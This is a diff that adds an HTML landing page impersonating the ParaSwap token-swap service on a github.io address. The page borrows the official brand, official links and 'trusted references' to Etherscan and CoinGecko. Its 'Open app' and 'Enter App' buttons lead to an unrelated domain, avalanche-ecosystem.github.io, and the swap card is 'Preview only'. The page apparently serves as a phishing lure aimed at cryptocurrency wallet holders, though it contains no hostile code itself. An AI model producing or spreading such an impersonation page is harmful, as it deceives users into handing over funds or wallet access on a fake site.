@@ -1,0 +1,135 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Paraswap</title>
+  <meta name="description" content="Paraswap lets you swap tokens at aggregated DEX prices from your own wallet.">
+  <link rel="canonical" href="https://paraswap-app.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#05070B">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Paraswap">
+  <meta property="og:description" content="Paraswap lets you swap tokens at aggregated DEX prices from your own wallet.">
+  <meta property="og:url" content="https://paraswap-app.github.io/">
+  <meta property="og:image" content="https://paraswap-app.github.io/favicon.png">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Paraswap">
+  <meta name="twitter:description" content="Paraswap lets you swap tokens at aggregated DEX prices from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://paraswap-app.github.io/#website",
+        "url": "https://paraswap-app.github.io/",
+        "name": "Paraswap",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://paraswap-app.github.io/#organization",
+        "name": "ParaSwap",
+        "url": "https://www.paraswap.xyz/",
+        "sameAs": [
+          "https://www.paraswap.xyz/",
+          "https://app.paraswap.xyz/",
+          "https://docs.velora.xyz/",
+          "https://x.com/veloradex",
+          "https://github.com/VeloraDEX",
+          "https://veloradex.medium.com/"
+        ]
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://paraswap-app.github.io/#app",
+        "name": "Paraswap",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://paraswap-app.github.io/",
+        "offers": {
+          "@type": "Offer",
+          "price": "0",
+          "priceCurrency": "USD"
+        }
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="#" aria-label="Paraswap">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>ParaSwap</span>
+    </a>
+    <nav class="nav" aria-label="Trusted references">
+      <a href="https://etherscan.io/token/0xcafe001067cdef266afb7eb5a286dcfd277f3de5" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://www.coingecko.com/en/coins/paraswap" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
+      <a href="https://docs.velora.xyz/" target="_blank" rel="nofollow noopener noreferrer">Docs</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-label="Paraswap overview">
+      <h1>Paraswap</h1>
+      <p class="sub"><strong>Paraswap</strong> lets you swap tokens at aggregated DEX prices from your own wallet.</p>
+    </section>
+
+    <section class="swap-card" aria-label="Swap preview">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="chip">
+            <img class="token" src="usdc.png" width="28" height="28" alt="USDC">
+            <span>USDC</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Switch swap direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="chip">
+            <img class="token" src="eth.png" width="28" height="28" alt="ETH">
+            <span>ETH</span>
+          </span>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+      <p class="note">Preview only</p>
+    </section>
+  </main>
+
+  <footer class="foot">Paraswap &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+
+    var button = document.querySelector("[data-switch]");
+    if (!button) {
+      return;
+    }
+
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".leg .chip");
+      if (chips.length < 2) {
+        return;
+      }
+
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  }());
+  </script>
+</body>
+</html>
